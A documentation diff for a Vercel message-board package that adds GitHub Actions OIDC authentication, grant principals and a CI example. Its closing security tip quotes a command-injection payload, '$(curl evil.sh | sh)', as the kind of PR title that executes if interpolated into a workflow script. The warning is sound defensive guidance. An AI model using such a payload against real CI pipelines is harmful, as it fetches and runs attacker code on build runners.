@@ -22,7 +22,7 @@ team. With `BOARD_URL` set, in Node, it's the board at that URL instead
 (`http()`, internal too: `src/server/backend-http.ts`), which is `vb serve`'s.
 Neither backend is exported: people write `board()`. In a
 Vercel deployment it authenticates with the deployment's OIDC token, and
-elsewhere with `BOARD_TOKEN` or the Vercel CLI's login, never `VERCEL_TOKEN`. Vercel's API keeps
+elsewhere with `BOARD_TOKEN`, a GitHub Actions job's OIDC token, or the Vercel CLI's login, never `VERCEL_TOKEN`. Vercel's API keeps
 the board: messages, threads, reactions, labels, a channel's changes,
 schedules, files, and watchers, whose matches it wakes the deployment to run.
 It doesn't run sync yet: `board({ sync })` on it throws when it binds.
@@ -258,16 +258,18 @@ checked with `@vercel/board/conformance`.
   board by its ID; `api`; `files`, how bytes reach storage) have no public
   form, and `team` and `fetch` are `board()`'s. It keeps nothing: its methods
   call `/v1/messageboard` as this deployment, with its OIDC token, or as you,
-  with `BOARD_TOKEN` or the login the Vercel CLI hands it, on the board
+  with `BOARD_TOKEN` or the login the Vercel CLI hands it, or in GitHub Actions
+  as the job's run, with its OIDC token for `https://api.vercel.com/v1/messageboard`, on the board
   `board({ name, team })` names. Messages, threads, reactions, labels, a channel's changes, schedules,
   files (direct uploads too, on URLs the API signs for the bytes' SHA-256),
   and watchers work. Vercel's API posts each schedule's sends, so `board()`'s
   middleware screens a schedule when it's made. What the API doesn't keep yet
   answers 501 `not_supported`: files on a scheduled message and a post's sync
-  targets. Grants go to the API, which takes no `github` or `oidc`
-  principal in a grant, or explains one (400 `unsupported_principal`: an app,
-  which an OIDC exchange policy issues tokens for, stands in); `vercel()`
-  says the refusals with a hint. It
+  targets. Grants go to the API, `github` and `oidc` principals included,
+  and what it refuses is said in its own words. It names a GitHub Actions run
+  `github:repo:<repository_id>` (handle `owner/repo`) and another issuer's
+  caller `oidc:<issuer host and path>:<sub>` (handle its `sub`), both of kind
+  `workflow`. It
   runs no sync: `bind` throws for a board with `sync`, `readSource` answers
   404 `not_synced_here`, and `typing` reaches no targets. Only a deployment's
   own credentials register watchers there: its OIDC token. Its watchers run as
@@ -2038,13 +2040,17 @@ const reply = await team.wait({ re: msg.id, after: msg.id }, { timeout: '30m' })
 - **`board()` with no backend is the team's board in Vercel's API,** the one
   `name` names on the team `team` names, on `vercel()`, with
   `board({ fetch })`'s credentials when it's given. In Node they default to
-  the deployment's OIDC token, which nothing in the environment replaces, or else `BOARD_TOKEN`, then the
+  the deployment's OIDC token, which nothing in the environment replaces, or else `BOARD_TOKEN`, then a
+  GitHub Actions job's OIDC token (both `ACTIONS_ID_TOKEN_REQUEST_URL` and `ACTIONS_ID_TOKEN_REQUEST_TOKEN`
+  set, audience `https://api.vercel.com/v1/messageboard`), sent as it is, then the
   login a CLI hands it (`VERCEL_AUTH_TOKEN`) or your `vercel login`, never `VERCEL_TOKEN`. A CLI
   that embeds board's says who its commands run as: the login it gives (`createApp({ login })`, or
   `createApp({ token })` for one someone passed it for a run, as `vercel board --token`) is the one
   that goes, wherever that CLI runs, ahead of them all, so `vercel board` is you, as every `vercel`
   command is, and a deployment's project or `BOARD_TOKEN` is `vb`'s to be. The team defaults
-  to `VERCEL_ORG_ID`, the deployment's when its token is what goes, or `.vercel/project.json`'s. With `BOARD_URL` set (in Node),
+  to `VERCEL_ORG_ID`, the deployment's when its token is what goes, or `.vercel/project.json`'s. A GitHub
+  token names no team, so with none of these a request fails before it's sent (`missing_team`): pass
+  `--scope <team ID>` or set `VERCEL_ORG_ID`. With `BOARD_URL` set (in Node),
   it's that board instead (on `http()`, internal), whatever the name: it
   sends a token in the order in [Tokens](#tokens), through Deployment
   Protection, and `board({ fetch })` never goes there. The default build, for
@@ -2401,9 +2407,12 @@ permissions:
 steps:
   - run: npx -y @vercel/board post errors-www "deploy failed: $SHA" --label source=ci
     env:
-      BOARD_URL: https://www.example.com/api/board
+      VERCEL_ORG_ID: team_abc123
       SHA: ${{ github.sha }}
 ```
+
+A grant lets the repository's runs in, with no secret:
+`vb grants create --github acme/www --git-branch main --can 'errors-www=post'`.
 
 **Pass event data through `env:`, never as `${{ }}` inside `run:`.** A PR title
 like `` $(curl evil.sh | sh) `` executes if it's interpolated into a script.
